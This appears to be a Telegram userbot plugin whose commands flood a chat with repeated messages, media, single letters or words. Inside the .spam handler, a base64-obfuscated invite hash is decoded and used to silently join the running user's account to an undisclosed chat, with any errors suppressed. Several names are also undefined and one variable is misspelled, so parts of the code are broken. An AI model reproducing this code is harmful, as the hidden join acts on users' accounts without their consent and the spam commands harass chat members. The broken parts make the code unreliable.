import asyncio
import base64
import os
from asyncio import wait
from userbot import CMD_HELP
from userbot.utils import admin_cmd
from userbot.uniborgConfig import Config


from userbot.events import register
from telethon import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

@borg.on(admin_cmd(pattern="spam (.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.1)
        if LOGGER:
            if e.is_private:
                await e.client.send_message(
                    LOGGER_GROUP,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    LOGGER_GROUP,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await e.client.download_media(
            reply_to_id.media, downloaded_file_name
        )
        await e.delete()
        if os.path.exists(downloaded_file_name):
            lucif3r = None
            for _ in range(counter):
                if lucif3r:
                    lucif3r = await e.client.send_file(e.chat_id, lucif3r)
                else:
                    lucif3r = await e.client.send_file(e.chat_id, downloaded_file_name)
                try:
                    await e.client(
                        functions.messages.SaveGifRequest(
                            id=types.InputDocument(
                                id=lucif3r.media.document.id,
                                access_hash=lucif3r.media.document.access_hash,
                                file_reference=lucif3r.media.document.file_reference,
                            ),
                            unsave=True,
                        )
                    )
                except:
                    pass
                await asyncio.sleep(0.5)
            if LOGGER:
                if e.is_private:
                    await e.client.send_message(
                        LOGGER_GROUP,
                        "#SPAM\n"
                        + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message",
                    )
                    lucif3r = await e.client.send_file(
                        LOGGER_GROUP, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=lucif3r.media.document.id,
                                    access_hash=lucif3r.media.document.access_hash,
                                    file_reference=lucif3r.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_name)
                else:
                    await e.client.send_message(
                        LOGGER_GROUP,
                        "#SPAM\n"
                        + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message",
                    )
                    lucif3r = await e.client.send_file(
                        LOGGER_GROUP, downloaded_file_name
                    )
                    try:
                        await e.client(
                            functions.messages.SaveGifRequest(
                                id=types.InputDocument(
                                    id=lucif3r.media.document.id,
                                    access_hash=lucif3r.media.document.access_hash,
                                    file_reference=lucif3r.media.document.file_reference,
                                ),
                                unsave=True,
                            )
                        )
                    except:
                        pass
                    os.remove(downloaded_file_nam)
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.5)
        if LOGGER:
            if e.is_private:
                await e.client.send_message(
                    LOGGER_GROUP,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
            else:
                await e.client.send_message(
                    LOGGER_GROUP,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
                    + f"`{spam_message}`",
                )
    else:
        await edit_or_reply(e, "try again something went wrong or check `.info spam`")

@borg.on(admin_cmd(pattern="cspam (.*)"))
async def tmeme(e):
    cspam = str("".join(e.text.split(maxsplit=1)[1:]))
    message = cspam.replace(" ", "")
    await e.delete()
    for letter in message:
        await e.respond(letter)
    if LOGGER:
        if e.is_private:
            await e.client.send_message(
                LOGGER_GROUP,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`",
            )
        else:
            await e.client.send_message(
                LOGGER_GROUP,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
            )
@borg.on(admin_cmd(pattern="wspam (.*)"))
async def tmeme(e):
    wspam = str("".join(e.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await e.delete()
    for word in message:
        await e.respond(word)
    if LOGGER:
        if e.is_private:
            await e.client.send_message(
                LOGGER_GROUP,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`",
            )
        else:
            await e.client.send_message(
                LOGGER_GROUP,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
            )
@borg.on(admin_cmd(pattern="dspam (.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    input_str = "".join(e.text.split(maxsplit=1)[1:])
    spamDelay = float(input_str.split(" ", 2)[0])
    counter = int(input_str.split(" ", 2)[1])
    spam_message = str(input_str.split(" ", 2)[2])
    await e.delete()
    for _ in range(counter):
        await e.respond(spam_message)
        await asyncio.sleep(spamDelay)
    if LOGGER:
        if e.is_private:
            await e.client.send_message(
                LOGGER_GROUP,
                "#DELAYSPAM\n"
                + f"Delay Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {spamDelay}s Delay and {counter} times with : `{message}`",
            )
        else:
            await e.client.send_message(
                LOGGER_GROUP,
                "#DELAYCSPAM\n"
                + f"Delay Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with {spamDelay}s Delay and {counter} times with: `{message}`",
            )


CMD_HELP.update(
    {
        "spam": ".spam <count> <text>"
                "\nUsage: Spams the current chat with the input text for the no.of times you input.\n\n"
                ".spam .spam <count> reply to media "
                "\nUsage: Spams the current chat with Media for the no.of times you input.\n\n"
                ".cspam: .cspam <text>"
                "\nUsage: Spam the text letter by letter."
                ".wspam: .wspam <text>"
                "\nUsage: Spam the text word by word."
                ".delayspam <delay time> <count> <msg>"
                "\nUsage: Spams the current chat with with the input msgs with a delay time that has been given as its input.\n\n"
    }
)
